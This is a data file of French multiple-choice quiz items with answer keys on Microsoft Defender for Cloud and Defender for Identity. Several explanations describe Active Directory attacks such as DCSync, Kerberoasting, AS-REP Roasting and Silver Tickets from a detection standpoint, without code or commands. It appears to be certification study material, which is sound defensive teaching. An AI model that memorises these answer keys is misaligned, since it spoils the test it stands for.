{id:120,category:"Defender for Cloud",question:"Comment intégrer Defender for Cloud avec Azure DevOps pour la sécurité des pipelines ?",options:["Via un webhook uniquement","Via Microsoft Security DevOps (MSDO) extension dans Azure DevOps qui analyse les configurations IaC, secrets, dépendances vulnérables dans les pipelines CI/CD","Via des agents sur les build agents","Via Azure Policy appliqués aux releases"],answer:1,explanation:"L'extension Microsoft Security DevOps (MSDO) s'installe dans les pipelines Azure DevOps et GitHub Actions, exécutant des outils de sécurité (Bandit, Terrascan, Checkov, etc.) sur le code, les IaC templates et les conteneurs."},
{id:121,category:"Defender for Identity",question:"Scénario: MDI détecte une alerte 'Suspected DCSync attack'. Qu'est-ce que cela signifie ?",options:["Un contrôleur de domaine est en panne","Un attaquant utilise les droits de réplication AD pour extraire tous les hashes de mots de passe du domaine (technique utilisée par Mimikatz dcsync)","Une synchronisation normale AD","Un problème de réseau entre DC"],answer:1,explanation:"DCSync est une attaque où l'attaquant (avec des droits DS-Replication-Get-Changes) imite un contrôleur de domaine et demande la réplication de tous les hashes de mots de passe via le protocole MS-DRSR. MDI détecte ce comportement anormal."},
{id:122,category:"Defender for Identity",question:"Qu'est-ce que le 'Lateral Movement Path' (LMP) dans MDI ?",options:["Le chemin réseau physique entre deux endpoints","Une visualisation des chemins potentiels qu'un attaquant pourrait utiliser pour se déplacer latéralement depuis un endpoint compromis vers des actifs sensibles en exploitant les credentials en cache","Le chemin de migration des VMs","Le parcours d'un ticket Kerberos"],answer:1,explanation:"Les Lateral Movement Paths dans MDI visualisent graphiquement comment un attaquant pourrait se déplacer latéralement: en utilisant des comptes admin locaux partagés, des credentials en cache, et des connexions réseau entre machines pour atteindre des cibles de haute valeur."},
{id:123,category:"Defender for Identity",question:"Quelle technique d'attaque MDI détecte quand un compte de service très utilisé se voit demander un TGS Kerberos ?",options:["Golden Ticket","Kerberoasting - demande massive de TGS pour des comptes de service avec SPN pour cracker offline","Silver Ticket","AS-REP Roasting"],answer:1,explanation:"Kerberoasting demande des tickets TGS (Ticket Granting Service) pour des comptes de service avec SPN enregistrés. Ces tickets sont chiffrés avec le hash du compte de service et peuvent être crackés offline. MDI détecte les demandes anormalement nombreuses de TGS."},
{id:124,category:"Defender for Identity",question:"Qu'est-ce que l'attaque 'AS-REP Roasting' et comment MDI la détecte-t-il ?",options:["Une attaque sur le protocole ARP","L'exploitation de comptes AD avec 'Do not require Kerberos preauthentication' pour obtenir des tickets AS-REP chiffrables offline","Une attaque DDoS sur le KDC","Une attaque de force brute sur LDAP"],answer:1,explanation:"AS-REP Roasting cible les comptes AD avec la pré-authentification Kerberos désactivée. L'attaquant demande un AS-REP (Authentication Service Response) sans credentials, reçoit un ticket chiffré avec le hash du compte, et le cracke offline. MDI détecte les demandes AS-REQ suspectes."},
{id:125,category:"Defender for Identity",question:"Scénario: MDI génère une alerte 'Reconnaissance using LDAP queries'. Quel est le risque ?",options:["Un problème de performance LDAP","Un attaquant énumère les utilisateurs, groupes, ACLs et GPOs d'Active Directory via des requêtes LDAP massives pour préparer une attaque plus ciblée","Une synchronisation AD normale","Un outil d'administration légitime"],answer:1,explanation:"L'énumération LDAP (via BloodHound, ADExplorer, etc.) permet à l'attaquant de cartographier l'AD: identifier les admins, les ACLs mal configurées, les chemins de delegation. C'est souvent la première étape d'une attaque AD ciblée."},
{id:126,category:"Defender for Identity",question:"Quelle est la différence entre MDI et Microsoft Defender for Endpoint pour la détection d'attaques d'identité ?",options:["Ils sont identiques","MDI se concentre sur les attaques contre Active Directory (côté identité/DC) via l'analyse du trafic AD; MDE se concentre sur les activités malveillantes sur les endpoints (comportement processus, fichiers)","MDE remplace MDI","MDI est uniquement pour Azure AD, MDE est pour on-premises"],answer:1,explanation:"MDI analyse le trafic réseau vers les contrôleurs de domaine (LDAP, Kerberos, RPC, DNS) pour détecter les attaques AD. MDE surveille les activités comportementales sur les endpoints (processus, fichiers, réseau). Ensemble ils couvrent l'ensemble kill chain."},
{id:127,category:"Defender for Identity",question:"Qu'est-ce qu'une attaque 'Silver Ticket' dans Kerberos ?",options:["Un faux TGT créé avec le hash KRBTGT","Un faux ticket TGS (service ticket) créé avec le hash du compte de service cible, permettant l'accès à ce service spécifique sans passer par le KDC","Un token OAuth compromis","Une attaque de rejeu sur les tickets Kerberos"],answer:1,explanation:"Contrairement au Golden Ticket (faux TGT utilisant KRBTGT), un Silver Ticket est un faux TGS créé avec le hash d'un compte de service spécifique. Il permet d'accéder directement au service sans interaction avec le KDC, plus difficile à détecter."},
{id:128,category:"Defender for Identity",question:"Comment déployer le capteur MDI sur un contrôleur de domaine sans SPAN/TAP ?",options:["Impossible sans port mirroring","En installant le capteur MDI directement sur le DC (standalone sensor). Le capteur capture le trafic réseau localement via les drivers Windows","En utilisant un agent séparé sur un serveur dédié uniquement","Via Azure Arc"],answer:1,explanation:"Le capteur MDI installé directement sur le contrôleur de domaine (standalone mode) capture le trafic réseau AD directement sur le DC via les drivers Windows Network, sans nécessiter de SPAN/TAP ou de serveur dédié séparé."},
{id:129,category:"Defender for Identity",question:"Scénario: Vous observez dans MDI qu'un utilisateur standard tente d'accéder aux attributs ms-MCS-AdmPwd dans AD. Qu'est-ce que cela indique ?",options:["Une requête AD normale","L'utilisateur tente de lire les mots de passe LAPS (Local Administrator Password Solution) des machines, ce qui nécessite des permissions spéciales non accordées à un utilisateur standard","Un problème de synchronisation AD","L'utilisateur accède à ses propres attributs"],answer:1,explanation:"ms-MCS-AdmPwd est l'attribut AD où LAPS stocke le mot de passe admin local. Un utilisateur standard tentant d'y accéder est un signal d'attaque pour récupérer des credentials admin locaux et les utiliser pour du mouvement latéral."},
{id:130,category:"Defender for Identity",question:"Qu'est-ce que 'Honeytoken' dans MDI ?",options:["Un token d'API sécurisé","Un compte de leurre créé délibérément et surveillé par MDI - toute activité sur ce compte est automatiquement suspecte car légitime aucun utilisateur ne devrait l'utiliser","Un système de récompenses pour les chasseurs de menaces","Un token de honeypot réseau"],answer:1,explanation:"Les Honeytokens dans MDI sont des comptes AD fictifs configurés comme leurres. Aucun utilisateur légitime ne devrait utiliser ces comptes. Toute activité (tentative d'authentification, accès LDAP) est automatiquement flagguée comme suspecte dans MDI."},
